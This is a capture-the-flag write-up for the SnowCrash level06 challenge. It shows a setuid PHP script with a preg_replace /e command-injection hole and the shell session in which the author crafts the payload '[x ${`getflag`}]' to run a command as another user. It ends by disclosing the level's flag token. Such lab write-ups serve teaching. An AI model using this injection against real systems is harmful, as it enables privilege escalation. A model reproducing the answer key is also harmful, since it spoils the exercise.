# Flag 06
-
``` shell
ls -al
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
```

- `cat level06` -> 
- `strings level06`

- ` ./level06`
`PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4`

- `cat level06.php`
```php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```


```php
#!/usr/bin/php
<?php
  function y($m) { 
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; 
  }

  function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
  }

  $r = x($argv[1], $argv[2]); 
  print $r;
?>
```

- try to exec level06 script
`./level06 level06.php`
show content of the level06.php

- more tries

``` shell
echo "aaa" > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
aaa

level06@SnowCrash:~$ echo "`ls`" > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
level06
level06.php
```
- Goooood, so we can pass a cmd with baskticks and that the level06 script can exec it
``` shell
level06@SnowCrash:~$ echo "`getflag`" > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level06@SnowCrash:~$ echo "`getflag`" > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level06@SnowCrash:~$ echo "${`getflag`}" > /tmp/aaa
-bash: ${`getflag`}: bad substitution
level06@SnowCrash:~$ echo '${`getflag`}' > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
${`getflag`}
level06@SnowCrash:~$ echo 'x ${`getflag`}' > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
x ${`getflag`}
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/aaa
level06@SnowCrash:~$ ./level06 /tmp/aaa
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

- after some tests we are the flag now `wiok45aaoguiboiki2tuin6ub`

